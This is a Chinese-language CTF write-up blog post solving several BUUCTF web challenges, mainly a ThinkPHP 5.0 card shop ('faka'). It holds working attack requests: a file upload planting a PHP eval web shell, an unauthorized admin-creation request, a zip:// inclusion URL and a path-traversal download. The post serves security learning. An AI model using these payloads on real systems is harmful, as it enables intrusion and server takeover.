---
title: "BUUCTF Web Writeup 12"
date: 2023-01-28T21:20:01+08:00
lastmod: 2023-01-28T21:20:01+08:00
draft: true
author: "X1r0z"

tags: []
categories: []

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

BUUCTF 刷题记录...

<!--more-->

## [HarekazeCTF2019]Sqlite Voting

vote.php

```php
<?php
error_reporting(0);

if (isset($_GET['source'])) {
  show_source(__FILE__);
  exit();
}

function is_valid($str) {
  $banword = [
    // dangerous chars
    // " % ' * + / < = > \ _ ` ~ -
    "[\"%'*+\\/<=>\\\\_`~-]",
    // whitespace chars
    '\s',
    // dangerous functions
    'blob', 'load_extension', 'char', 'unicode',
    '(in|sub)str', '[lr]trim', 'like', 'glob', 'match', 'regexp',
    'in', 'limit', 'order', 'union', 'join'
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $str)) {
    return false;
  }
  return true;
}

header("Content-Type: text/json; charset=utf-8");

// check user input
if (!isset($_POST['id']) || empty($_POST['id'])) {
  die(json_encode(['error' => 'You must specify vote id']));
}
$id = $_POST['id'];
if (!is_valid($id)) {
  die(json_encode(['error' => 'Vote id contains dangerous chars']));
}

// update database
$pdo = new PDO('sqlite:../db/vote.db');
$res = $pdo->query("UPDATE vote SET count = count + 1 WHERE id = ${id}");
if ($res === false) {
  die(json_encode(['error' => 'An error occurred while updating database']));
}

// succeeded!
echo json_encode([
  'message' => 'Thank you for your vote! The result will be published after the CTF finished.'
]);
```

没啥意思... 学个思路吧

[https://xz.aliyun.com/t/6628#toc-4](https://xz.aliyun.com/t/6628#toc-4)

## [极客大挑战 2020]Roamphp2-Myblog

主页 page 参数存在文件包含, 后缀限制为 php

login.php

```php
......
<?php
require_once("secret.php");
mt_srand($secret_seed);
$_SESSION['password'] = mt_rand();
?>
```

secret.php

```php
<?php
$secret_seed = mt_rand();
?>
```

/admin/user.php

```php
<?php
error_reporting(0);
session_start();
$logined = false;
if (isset($_POST['username']) and isset($_POST['password'])){
	if ($_POST['username'] === "Longlone" and $_POST['password'] == $_SESSION['password']){  // No one knows my password, including myself
		$logined = true;
		$_SESSION['status'] = $logined;
	}
}
if ($logined === false && !isset($_SESSION['status']) || $_SESSION['status'] !== true){
    echo "<script>alert('username or password not correct!');window.location.href='index.php?page=login';</script>";
	die();
}
?>
......
<?php
if(isset($_FILES['Files']) and $_SESSION['status'] === true){
    $tmp_file = $_FILES['Files']['name'];
    $tmp_path = $_FILES['Files']['tmp_name'];
    if(($extension = pathinfo($tmp_file)['extension']) != ""){
        $allows = array('gif','jpeg','jpg','png');
        if(in_array($extension,$allows,true) and in_array($_FILES['Files']['type'],array_map(function($ext){return 'image/'.$ext;},$allows),true)){
                $upload_name = sha1(md5(uniqid(microtime(true), true))).'.'.$extension;
                move_uploaded_file($tmp_path,"assets/img/upload/".$upload_name);
                echo "<script>alert('Update image -> assets/img/upload/${upload_name}') </script>";
        } else {
            echo "<script>alert('Update illegal! Only allows like \'gif\', \'jpeg\', \'jpg\', \'png\' ') </script>";
        }
    }
}
?>
......
```

首先有一个逻辑漏洞, 随机 password 的赋值只写在了 login.php 里面, 所以单独拿一个新 session 只访问 user.php, 这样获取 `$_SESSION['password']` 的值就会变成 NULL

然后文件上传写死了后缀只能为图片格式, 但是之前有一个文件包含的点, 结合 `zip://` 等压缩流伪协议就能绕过后缀限制, 或者利用 filter chain 实现一键 rce

![image-20230129180003699](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301291800823.png)

![image-20230129180013576](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301291800658.png)

```php
http://43127c58-2d96-4086-a1f4-8706bc073ec6.node4.buuoj.cn:81/index.php?page=zip://assets/img/upload/91f48680be864b8d39ba28c76b52083498edb822.jpg%23test
```

![image-20230129180119774](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301291801839.png)

`phar://` 也能达到类似的效果

## [NPUCTF2020]web🐕

[https://tiaonmmn.github.io/2020/04/23/BUUOJ%E5%88%B7%E9%A2%98-Web-WebDog/](https://tiaonmmn.github.io/2020/04/23/BUUOJ%E5%88%B7%E9%A2%98-Web-WebDog/)

```java
System.out.println(new String(new byte[]{102, 108, 97, 103, 123, 119, 101, 54, 95, 52, 111, 103, 95, 49, 115, 95, 101, 52, 115, 121, 103, 48, 105, 110, 103, 125 }));
```

## [网鼎杯 2020 半决赛]faka

发卡平台, thinkphp 5.0, 给了源码

三种方式 getshell

第一种是通杀的 thinkphp 5.0 rce

[https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-5.x-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.10.html](https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-5.x-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.10.html)

![image-20230130143820051](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301301438307.png)

第二种是前台文件上传 getshell

/application/admin/controller/Plugs.php

![image-20230130143947493](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301301439612.png)

move 方法注释

![image-20230130144011645](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301301440680.png)

跟进

![image-20230130144137472](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301301441584.png)

跟进 buildSaveName 方法

![image-20230130144203306](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301301442423.png)

关键在那个 if 判断, 如果传入的 `$md5[1]` 也就是 `$savename` 不含 `.`的话, 则会手动加上上传时 filename 的后缀, 否则不做任何处理直接 return

这样我们控制 `$md5[1]` 为 `xxx.php` 就可以 getshell, 并且前面对后缀的验证是根据 filename 来的, 对于 `$md5` 没有任何影响, 也就绕过了限制

```
POST /html/index.php?s=admin/Plugs/upload HTTP/1.1
Host: 1bfe4913-52da-4571-aa59-3bca4bf51d44.node4.buuoj.cn:81
Content-Length: 2339
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUa26ECeyNjKcbTPN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.70
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

------WebKitFormBoundaryUa26ECeyNjKcbTPN
Content-Disposition: form-data; name="file"; filename="2.png"
Content-Type: image/png

............
<?php eval($_REQUEST['a']); ?>
------WebKitFormBoundaryUa26ECeyNjKcbTPN
Content-Disposition: form-data; name="md5"

1234567812345678123456781234.php
------WebKitFormBoundaryUa26ECeyNjKcbTPN
Content-Disposition: form-data; name="token"

d6d4c55aac6d9512c17b1986501caa23
------WebKitFormBoundaryUa26ECeyNjKcbTPN
```

![image-20230130145122929](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301301451007.png)

提示上传失败其实是由 `$site_url = FileService::getFileUrl($filename, 'local')` 这句引起, 因为实际上传后保存的文件名与 filename 并不相同, 所以会报错, 但其实 php 已经上传成功了

```
http://1bfe4913-52da-4571-aa59-3bca4bf51d44.node4.buuoj.cn:81/static/upload/1234567812345678/123456781234.php
```

![image-20230130145248129](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301301452184.png)

这个文件上传的点有好几个, 利用方式都差不多

第三种是任意文件下载, 这个不算 getshell, 但是也能猜出来 flag 的位置

/application/manage/controller/Backup.php

![image-20230130150209812](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301301502923.png)

需要登录后台, 有两种方法

一种是直接从 sql 里面拿 admin 密码

```
admin 81c47be5dc6110d5087dd4af8dc56552
```

md5 解密后是 `admincccbbb123`

另一种是后台未授权添加用户

/application/admin/controller/Index.php

![image-20230130150439397](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301301504510.png)

限制只能更改当前用户的资料, 但其实把 request id 和 session id 置空就行

跟进 \_form 方法

![image-20230130150626972](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301301506084.png)

post 时会先调用回调函数 `_form_filter`, 然后再执行 save 操作

回调在同级的 User.php 里面

![image-20230130150714665](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301301507772.png)

 authorize 参数代表用户权限大小, 根据 sql 文件得知最大值为 3

```
POST /html/index.php?s=admin/Index/info HTTP/1.1
Host: 1bfe4913-52da-4571-aa59-3bca4bf51d44.node4.buuoj.cn:81
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://b936f4d6-3fd2-4344-92f9-88475390d062.node4.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.70
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://b936f4d6-3fd2-4344-92f9-88475390d062.node4.buuoj.cn:81/admin/Index/pass
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 66

username=admin123&phone=&mail=&password=admin123&desc=&authorize=3
```

![image-20230130150836127](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301301508204.png)

登录后下载 flag.txt

```
http://1bfe4913-52da-4571-aa59-3bca4bf51d44.node4.buuoj.cn:81/manage/backup/downloadBak?file=../../../../../flag.txt
```

## [红明谷CTF 2021]JavaWeb

